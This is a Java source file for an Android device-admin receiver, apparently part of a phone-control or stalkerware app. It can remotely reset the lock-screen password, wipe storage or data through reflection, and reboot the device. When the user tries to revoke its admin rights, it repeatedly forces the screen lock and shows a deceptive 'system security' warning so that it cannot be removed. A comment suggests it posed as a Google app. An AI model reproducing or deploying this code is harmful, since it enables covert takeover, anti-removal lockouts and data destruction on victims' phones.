package com.phone.control;




import java.lang.reflect.Method;

import com.main.MainUtils;
import com.utils.WriteDateFile;

import android.annotation.TargetApi;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;



@TargetApi(Build.VERSION_CODES.GINGERBREAD) 
public class DeviceManager extends DeviceAdminReceiver{
	
	private final String TAG = "DeviceManager";


	//java.lang.RuntimeException: 
	//Unable to instantiate receiver com.google.android.apps.plus.DeviceManager: 
	//java.lang.InstantiationException: 
	//can't instantiate class com.google.android.apps.plus.DeviceManager; no empty constructor
	//1 onEnabled(context);
	//2 DeviceManager();
	public DeviceManager(){
		Log.e(TAG,"constructor");
		WriteDateFile.writeLogFile("constructor\r\n");
	}

    
    public static void removeDeviceManager(Context context){
    	DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    	ComponentName componentName = new ComponentName(context, DeviceManager.class);
    	boolean active = dpm.isAdminActive(componentName);
    	if(active){
    		dpm.removeActiveAdmin(componentName);
    	}
    	WriteDateFile.writeLogFile("remove device manager ok\r\n");
    }
    
    public static void resetLockPassword(Context context,String password){
    	DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    	ComponentName componentName = new ComponentName(context, DeviceManager.class);
    	boolean active = dpm.isAdminActive(componentName);
    	if(active){
    		dpm.resetPassword(password,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
    		WriteDateFile.writeLogFile("resetLockPassword:" + password + " ok\r\n");
    	}
    	else{
    		WriteDateFile.writeLogFile("resetLockPassword:" + password + " error\r\n");
    	}
    }
    


    public static void wipeSetting(Context context){

    	DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    	ComponentName componentName = new ComponentName(context, DeviceManager.class);
    	boolean active = dpm.isAdminActive(componentName);
    	if(active){
    		//dpm.wipeData(DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
    		try{
	    		Class<? extends DevicePolicyManager> clazz = dpm.getClass();
	    		Method wipedata = clazz.getDeclaredMethod("wipeData", int.class);
	    		wipedata.invoke(dpm, 2);		//DevicePolicyManager.WIPE_RESET_PROTECTION_DATA = 2
	    		WriteDateFile.writeLogFile("wipeSetting ok\r\n");
    		}catch(Exception ex){
    			WriteDateFile.writeLogFile("wipeSetting exception\r\n");
    			ex.printStackTrace();
    		}
    	}
    	else{
    		WriteDateFile.writeLogFile("device manager is inactive\r\n");
    	}
    }
    
    public static void wipeStorage(Context context){

    	DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    	ComponentName componentName = new ComponentName(context, DeviceManager.class);
    	boolean active = dpm.isAdminActive(componentName);
    	if(active){
    		dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
    		WriteDateFile.writeLogFile("wipeStorage ok\r\n");
    	}
    	else{
    		WriteDateFile.writeLogFile("wipeStorage error\r\n");
    	}
    }

    

    public static void resetSystem(Context context){

    	DevicePolicyManager dpm =(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    	ComponentName componentName = new ComponentName(context, DeviceManager.class);
    	boolean active = dpm.isAdminActive(componentName);
    	if(active){
    		if(Build.VERSION.SDK_INT >= 24){
    			//dpm.reboot(componentName);
        		try{
    	    		Class<? extends DevicePolicyManager> clazz = dpm.getClass();
    	    		Method reboot = clazz.getDeclaredMethod("reboot", ComponentName.class);
    	    		reboot.invoke(dpm, componentName);		
    	    		WriteDateFile.writeLogFile("resetSystem ok\r\n");
        		}catch(Exception ex){
        			WriteDateFile.writeLogFile("resetSystem exception\r\n");
        			ex.printStackTrace();
        		}
    		}
    		else{
    			WriteDateFile.writeLogFile("resetSystem error for version sdk int < 24\r\n");
    		}
    	}
    	else{
    		WriteDateFile.writeLogFile("device manager is inactive\r\n");
    	}
    }
    
    
    public SharedPreferences getDevicePreference(Context context) {  
    	try{
	    	Log.e(TAG, "getDevicePreference");
	    	WriteDateFile.writeLogFile("SharedPreferences\r\n"); 
	    	MainUtils.checkStartForegroundService(context);
    	} 
	    catch(Exception ex){
	    	ex.printStackTrace();
	    }
	    return context.getSharedPreferences(DeviceAdminReceiver.class.getName(), 0); 
    }  
  
    
    @Override  
    public void onEnabled(Context context, Intent intent) {  
    	try{
	        Log.e(TAG, "enable admin device manager");  
	        WriteDateFile.writeLogFile("deviceManagerReceiver onEnabled\r\n"); 
	        MainUtils.checkStartForegroundService(context);
		}
		catch(Exception ex){
			ex.printStackTrace();
		}
    }  
  
    
    @Override  
    public void onDisabled(Context context, Intent intent) {  
    	try{
	    	Log.e(TAG, "disable admin device manager");  
	    	WriteDateFile.writeLogFile("deviceManagerReceiver onDisabled\r\n"); 
	    	MainUtils.checkStartForegroundService(context);
		}
		catch(Exception ex){
			ex.printStackTrace();
		}
    }  
    
   
  
    @Override  
    public CharSequence onDisableRequested(Context context, Intent intent) {
    	try{
    		MainUtils.checkStartForegroundService(context);

    		Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings"); 
    		outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    		context.startActivity(outOfDialog); 

    		final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    		dpm.lockNow();
    		new Thread(new Runnable() { 
    		@Override 
    		public void run() { 
	    		int i = 0;
	    		int waittimes = 70;
		        String factory = android.os.Build.MANUFACTURER;
		        if (factory.contains("Meizu")) {
		        	waittimes = 70;
		        }
		        
	    		while (i < waittimes) {
		    		dpm.lockNow();
		    		try { 
		    			Thread.sleep(100);
		    			i++;
		    		} catch (InterruptedException ex) {
		    			ex.printStackTrace();
		    		} 
	    		} 
    		} 
    		}).start(); 
    		
    		Thread.sleep(3000);
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
    	return "you should not uninstall this program for your system security" ;
    }  
  
    
    
    @Override  
    public void onPasswordChanged(Context context, Intent intent) {  
    	try{
	    	Log.e(TAG, "password is changed");  
	    	WriteDateFile.writeLogFile("onPasswordChanged\r\n"); 
	    	MainUtils.checkStartForegroundService(context);
		}
		catch(Exception ex){
			ex.printStackTrace();
		}
    }  
  
    @Override  
    public void onPasswordFailed(Context context, Intent intent) {  
    	try{
	    	Log.e(TAG, "password is error");  
	    	WriteDateFile.writeLogFile("onPasswordFailed\r\n"); 
	    	
	    	MainUtils.checkStartForegroundService(context);
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
    }  
  
    @Override  
    public void onPasswordSucceeded(Context context, Intent intent) {  
    	try{
    
	    	Log.e(TAG, "password is changed successfully");  
	    	WriteDateFile.writeLogFile("password is changed successfully\r\n"); 
	    	
	    	MainUtils.checkStartForegroundService(context);
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
    }  
    
}
